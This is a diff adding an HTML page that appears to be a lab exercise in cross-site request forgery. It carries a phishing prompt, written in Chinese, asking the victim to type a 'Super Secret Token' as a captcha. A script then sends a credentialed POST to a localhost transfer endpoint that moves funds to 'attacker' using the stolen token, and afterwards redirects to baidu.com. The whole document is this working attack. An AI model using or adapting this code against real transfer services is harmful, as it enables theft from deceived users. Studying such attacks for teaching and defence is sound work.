@@ -1,0 +1,21 @@
+<p>请输入转账页面下的 Super Secret Token 来验证您的身份</p>
+
+<input id="token" type="text" placeholder="Captcha">
+<button onClick="gotEm()">Confirm</button>
+
+<script>
+function gotEm() {
+  var token = document.getElementById("token").value;
+  var request = new XMLHttpRequest();
+  request.open("POST", "http://localhost:3000/super_secure_post_transfer", false);
+  request.setRequestHeader("Content-type","application/x-www-form-urlencoded");
+  request.withCredentials = true;
+  try {
+    request.send("quantity=10&destination_username=attacker&tokeninput=" + token);
+  } catch (err) {
+    // Do nothing on inevitable XSS error
+  } finally {
+    window.top.location = "http://baidu.com";
+  }
+}
+</script>
